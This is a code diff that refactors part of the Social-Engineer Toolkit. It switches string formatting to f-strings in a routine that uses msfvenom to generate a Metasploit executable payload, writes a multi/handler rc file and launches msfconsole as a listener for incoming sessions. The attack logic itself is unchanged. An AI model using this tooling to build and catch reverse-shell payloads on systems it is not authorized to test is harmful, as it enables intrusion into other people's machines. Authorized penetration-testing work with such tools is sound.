@@ -15,15 +15,18 @@ meta_path = meta_path()
 
 def payload_generate(payload, lhost, port):
     # generate metasploit
-    subprocess.Popen(meta_path + "msfvenom -p %s LHOST=%s LPORT=%s --format=exe > %s/payload.exe" %
-                     (payload, lhost, port, userconfigpath), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
-    # write out the rc file
-    filewrite = open(userconfigpath + "meta_config", "w")
-    filewrite.write(
-        "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (payload, lhost, port))
-    filewrite.close()
+    subprocess.Popen(
+        f"{meta_path}msfvenom -p {payload} LHOST={lhost} LPORT={port} --format=exe > {userconfigpath}/payload.exe",
+        stderr=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        shell=True,
+    ).wait()
+    with open(f"{userconfigpath}meta_config", "w") as filewrite:
+        filewrite.write(
+            "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (payload, lhost, port))
     print_status(
-        "Payload has been exported to the default SET directory located under: " + userconfigpath + "payload.exe")
+        f"Payload has been exported to the default SET directory located under: {userconfigpath}payload.exe"
+    )
 
 show_payload_menu2 = create_menu(payload_menu_2_text, payload_menu_2)
 payload = (raw_input(setprompt(["4"], "")))
@@ -45,8 +48,9 @@ if check_options("INFECTION_MEDIA=") != "ON":
     # start the payload for the user
     payload_query = raw_input(setprompt(
         ["4"], "Do you want to start the payload and listener now? (yes/no)"))
-    if payload_query.lower() == "y" or payload_query.lower() == "yes":
+    if payload_query.lower() in ["y", "yes"]:
         print_status(
             "Launching msfconsole, this could take a few to load. Be patient...")
-        subprocess.Popen(meta_path + "msfconsole -r " +
-                         userconfigpath + "meta_config", shell=True).wait()
+        subprocess.Popen(
+            f"{meta_path}msfconsole -r {userconfigpath}meta_config", shell=True
+        ).wait()
